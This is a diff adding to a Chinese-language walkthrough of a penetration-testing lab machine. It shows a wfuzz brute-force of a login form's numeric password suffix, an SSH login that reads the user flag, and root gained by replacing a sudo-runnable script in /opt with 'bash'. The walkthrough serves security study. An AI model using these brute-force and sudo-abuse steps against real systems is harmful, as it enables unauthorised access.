@@ -36,4 +36,38 @@ username=admi&password=admi2024@7712
 
 ┌──(kali㉿kali)-[~/桌面/OSCP]
 └─$ for i in {1000..10000};do echo $i;done > numbers.txt
+
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ wfuzz -X POST -d "username=matthew&password=matthew2024@FUZZ" -w 1234 -u http://192.168.18.238/login.php --hw 103
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload     
+=====================================================================
+
+000001555:   302        0 L      0 W        0 Ch        "1554"  
+```
+
+所以用户密码是`matthew: matthew2023@1554
+ssh连接
+```js
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ ssh matthew@192.168.18.238  //matthew2023@1554
+
+matthew@uvalde:~$ cat user.txt 
+6e4136fbed8f8c691996dbf42697d460
+
+```
+# 提权
+```c
+sudo -l //(ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
+这里有个勒索程序
+matthew@uvalde:~$ sudo /bin/bash /opt/superhack 
+Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.                                                        
+```
+不过这里写什么并不重要，重要的是我们可以修改该文件
+我们将superhack 文件重命名为superhack.back，然后重新创建一个superhack 文件，里面写入bash，然后使用sudo 执行，成功获取root 权限。
+```c
+matthew@uvalde:~$ cd  /opt/
+matthew@uvalde:/opt$ mv superhack superhack.bak
+matthew@uvalde:/opt$ echo "bash" > superhack
+
 ```
